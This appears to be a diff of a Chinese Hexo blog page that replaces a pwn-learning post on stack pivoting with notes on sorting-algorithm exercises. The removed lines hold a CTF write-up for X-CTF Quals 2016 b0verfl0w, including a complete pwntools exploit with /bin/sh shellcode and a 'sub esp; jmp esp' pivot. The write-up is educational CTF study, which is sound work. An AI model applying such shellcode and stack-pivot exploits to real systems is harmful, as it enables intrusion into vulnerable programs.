@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn ROP,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,22 +79,19 @@
 
 
 
-<meta name="description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
-<meta name="keywords" content="pwn ROP">
+<meta name="description" content="1-1对N个记录进行堆排序，需要的额外空间为O(N)。 这是错的，其实只需要记录temp的一个，也就是O(1)，这里给个统计好的表  1-2对N个记录进行简单选择排序，比较次数和移动次数分别为O(N2)和O(N)。 这个对的，选择排序的时间基本都浪费在比较上了。。。 1-3希尔排序是稳定的算法。 (1分) 最不稳定的还差不多 1-5对N个记录进行归并排序，归并趟数的数量级是O(NlogN)。 上面">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习（6）花式栈溢出1">
-<meta property="og:url" content="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/index.html">
+<meta property="og:title" content="数据结构基础--排序">
+<meta property="og:url" content="http://yoursite.com/2018/12/21/数据结构基础-排序/index.html">
 <meta property="og:site_name" content="Asa9ao">
-<meta property="og:description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
+<meta property="og:description" content="1-1对N个记录进行堆排序，需要的额外空间为O(N)。 这是错的，其实只需要记录temp的一个，也就是O(1)，这里给个统计好的表  1-2对N个记录进行简单选择排序，比较次数和移动次数分别为O(N2)和O(N)。 这个对的，选择排序的时间基本都浪费在比较上了。。。 1-3希尔排序是稳定的算法。 (1分) 最不稳定的还差不多 1-5对N个记录进行归并排序，归并趟数的数量级是O(NlogN)。 上面">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg">
-<meta property="og:updated_time" content="2018-11-21T12:01:10.077Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fyejgnvnd4j310z0u0dsf.jpg">
+<meta property="og:updated_time" content="2018-12-21T12:55:05.320Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习（6）花式栈溢出1">
-<meta name="twitter:description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
-<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg">
+<meta name="twitter:title" content="数据结构基础--排序">
+<meta name="twitter:description" content="1-1对N个记录进行堆排序，需要的额外空间为O(N)。 这是错的，其实只需要记录temp的一个，也就是O(1)，这里给个统计好的表  1-2对N个记录进行简单选择排序，比较次数和移动次数分别为O(N2)和O(N)。 这个对的，选择排序的时间基本都浪费在比较上了。。。 1-3希尔排序是稳定的算法。 (1分) 最不稳定的还差不多 1-5对N个记录进行归并排序，归并趟数的数量级是O(NlogN)。 上面">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fyejgnvnd4j310z0u0dsf.jpg">
 
 
 
@@ -124,13 +121,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/21/数据结构基础-排序/">
 
 
 
 
 
-  <title>pwn学习（6）花式栈溢出1 | Asa9ao</title>
+  <title>数据结构基础--排序 | Asa9ao</title>
   
 
 
@@ -257,7 +254,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/21/数据结构基础-排序/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asa9ao">
@@ -274,7 +271,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习（6）花式栈溢出1</h1>
+          <h1 class="post-title" itemprop="name headline">数据结构基础--排序</h1>
         
 
         <div class="post-meta">
@@ -286,8 +283,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T19:22:14+08:00">
-                2018-11-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-21T18:16:46+08:00">
+                2018-12-21
               </time>
             
 
@@ -309,8 +306,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
                   </a>
                 </span>
 
@@ -346,31 +343,55 @@
       
 
       
-        <p>因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。</p>
-<h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：</p>
+        <p><strong>1-1对N个记录进行堆排序，需要的额外空间为O(N)。</strong></p>
+<p>这是错的，其实只需要记录temp的一个，也就是O(1)，这里给个统计好的表</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyejgnvnd4j310z0u0dsf.jpg" alt=""></p>
+<p><strong>1-2对N个记录进行简单选择排序，比较次数和移动次数分别为O(N2)和O(N)。</strong></p>
+<p>这个对的，选择排序的时间基本都浪费在比较上了。。。</p>
+<p><strong>1-3希尔排序是稳定的算法。 (1分)</strong></p>
+<p>最不稳定的还差不多</p>
+<p><strong>1-5对N个记录进行归并排序，归并趟数的数量级是O(NlogN)。</strong></p>
+<p>上面总结的表里给了</p>
+<p><strong>2-1对一组包含10个元素的非递减有序序列，采用直接插入排序排成非递增序列，其可能的比较次数和移动次数分别是</strong></p>
+<p>直接插入排序每回合的比较次数和元素移动次数等于其原始位置和插入位置之间的偏移。最好情况下（有序），需要比较(n-1)次，移动0次；最差情况下，需要比较1+2+…+(n-1)=n(n-1)/2次，移动n(n-1)/2次。所以答案都要小于50</p>
+<p><strong>2-2设有1000个元素的有序序列，如果用二分插入排序再插入一个元素，则最大比较次数是</strong></p>
+<p>log~2~N，不再重复了</p>
+<p><strong>2-3用直接插入排序方法对下面四个序列进行排序（由小到大），元素比较次数最少的是（）。</strong></p>
+<p>逆序对越少比较次数越少</p>
+<p><strong>2-4在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左右指针都会停止移动，那么当所有元素都相等时，算法的时间复杂度是多少</strong>2-5</p>
+<p><strong>在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左右指针都不停止移动，那么当所有元素都相等时，算法的时间复杂度是多少？</strong></p>
+<p><strong>在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左指针停止移动，而右指针在同样情况下却不停止移动，那么当所有元素都相等时，算法的时间复杂度是多少？</strong></p>
+<p>推荐记住吧。。都停止是O(NlogN)，不停止的话就是O(N^2^)</p>
+<p><strong>2-7对N个不同的数据采用冒泡算法进行从大到小的排序，下面哪种情况下肯定交换元素次数最多？</strong></p>
+<p>答案就是。。。完全反着的呗</p>
+<p><strong>2-8对于7个数进行冒泡排序，需要进行的比较次数为：</strong></p>
+<p>冒泡最差就是7+6+5+4+3+2+1，也就是21，其实就是等差数列的公式，n(n-1)/2</p>
+<p><strong>2-9有组记录的排序码为{ 46，79，56，38，40，84 }，则利用堆排序的方法建立的初始堆为：</strong></p>
+<p>简单说一下怎么建立初始堆，首先将给的记录按照层序构建一个完全二叉树，接着进行调整（以大顶堆为例）</p>
 <ul>
-<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
-<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
-<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
+<li><p>自己最大，不用调整</p>
+</li>
+<li><p>左孩子最大，交换该非叶结点与其左孩子的值，并考察以左孩子为根的子树是否满足大顶堆的要求，不满足递归向下处理</p>
+</li>
+<li><p>右孩子最大，交换该非叶结点与其右孩子的值，并考察以右孩子为根的子树是否满足大顶堆的要求，不满足递归向下处理</p>
+</li>
 </ul>
-<p>当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针</p>
-<h2 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h2><p>原理看完了就拿题目来练练手吧。题目在ctf wiki的github上可以找到。老规矩先拿ida瞅一眼（保护机制检查不说了，这题啥也没有）<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg" alt=""><br>可以看到vul函数很明显有栈溢出漏洞，而且还意外发现有个hint的函数，不得不说出题人挺友好的<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg" alt=""><br>可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。</p>
-<p>很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了</p>
-<p>因为提示很明显了，让esp减掉了0x24，那我们可以想到，我们完全可以在栈上布置shellcode（没有开启DEP），填充完后让esp减掉某个值，再跳转到对应位置，那我们的shellcode不就被执行了吗。</p>
-<p>说干就干，首先要找到能够让我们劫持栈指针的godget，拿ROPgadget查一下<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg" alt=""><br>可以看到有jmp esp这个指令，那我们就可以开始我们的exp构造工作了</p>
-<pre><code>from pwn import *
-p = process(&apos;./b0verfl0w.dms&apos;)
-jmp_esp = 0x08048504
-shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
-shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
-shellcode += &quot;\x0b\xcd\x80&quot;
-sub_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)
-payload = shellcode.ljust(0x20,&apos;a&apos;) + &apos;aaaa&apos; +p32(jmp_esp) + sub_jmp
-#payload = shellcode + (0x20 - len(shellcode))*&apos;a&apos; + &apos;aaaa&apos; + p32(jmp_esp) + sub_jmp
-p.sendline(payload)
-p.interactive()
-</code></pre><p>为什么是-0x28呢？实际上是pad + ebp + retaddr算出来的，pad是0x20，四位的ebp，四位的retaddr，自然是0x28了，当然你也可以用别的，不过那就需要你自己改一下shellcode的布置了。</p>
-<p>successful</p>
+<p><strong>2-10采用递归方式对顺序表进行快速排序，下列关于递归次数的叙述中，正确的是：</strong></p>
+<p>递归次数与每次划分后得到的分区处理顺序无关</p>
+<p><strong>2-11对N个记录进行快速排序，在最坏的情况下，其时间复杂度是：</strong></p>
+<p>上面的表中给出了，不再多说</p>
+<p><strong>2-12有组记录的排序码为{46，79，56，38，40，84 }，采用快速排序（以位于最左位置的对象为基准而）得到的第一次划分结果为：</strong></p>
+<blockquote>
+<p>base = 46</p>
+<ol>
+<li>i = 0; j = 5<br>此时 46, 79, 56, 38, 40, 84<br>从右往左找比base小的数，如果找到，则替换i处的值 </li>
+<li>i = 0; j = 4<br>此时 40， 79，56，38，40，84<br>从左往右找比base大的数，如果找到，则替换j处的值 </li>
+<li>i = 1;j = 4<br>此时 40， <strong>79</strong>，56，38，<strong>79</strong>，84<br>从右往左找比base小的数，如果找到，则替换i处的值 </li>
+<li>i = 1;j = 3<br>此时 40， 38，56，38，79，84<br>从左往右找比base大的数，如果找到，则替换j处的值 </li>
+<li>i = 2;j = 3<br>此时 40， 38，56，56，79，84</li>
+<li>i=2 处填上base值46<br>此时 40， 38，46，56，79，84<br>选C</li>
+</ol>
+</blockquote>
 
       
     </div>
@@ -386,12 +407,6 @@ p.interactive()
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/pwn-ROP/" rel="tag"># pwn ROP</a>
-          
-        </div>
-      
 
       
       
@@ -401,8 +416,8 @@ p.interactive()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/20/pwn学习（5）格式化字符串漏洞2/" rel="next" title="pwn学习（5）格式化字符串漏洞2">
-                <i class="fa fa-chevron-left"></i> pwn学习（5）格式化字符串漏洞2
+              <a href="/2018/12/20/数据结构基础-树、森林、哈夫曼树/" rel="next" title="数据结构基础--树、森林、哈夫曼树">
+                <i class="fa fa-chevron-left"></i> 数据结构基础--树、森林、哈夫曼树
               </a>
             
           </div>
@@ -411,8 +426,8 @@ p.interactive()
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/11/22/pwn学习（7）花式栈溢出2/" rel="prev" title="pwn学习（7）花式栈溢出2">
-                pwn学习（7）花式栈溢出2 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/29/数据结构基础-二叉树/" rel="prev" title="数据结构基础--二叉树">
+                数据结构基础--二叉树 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -465,17 +480,8 @@ p.interactive()
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -535,22 +541,6 @@ p.interactive()
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-pivoting"><span class="nav-number">1.</span> <span class="nav-text">stack pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理说明"><span class="nav-number">1.1.</span> <span class="nav-text">原理说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-CTF-Quals-2016-b0verfl0w"><span class="nav-number">1.2.</span> <span class="nav-text">X-CTF Quals 2016 - b0verfl0w</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
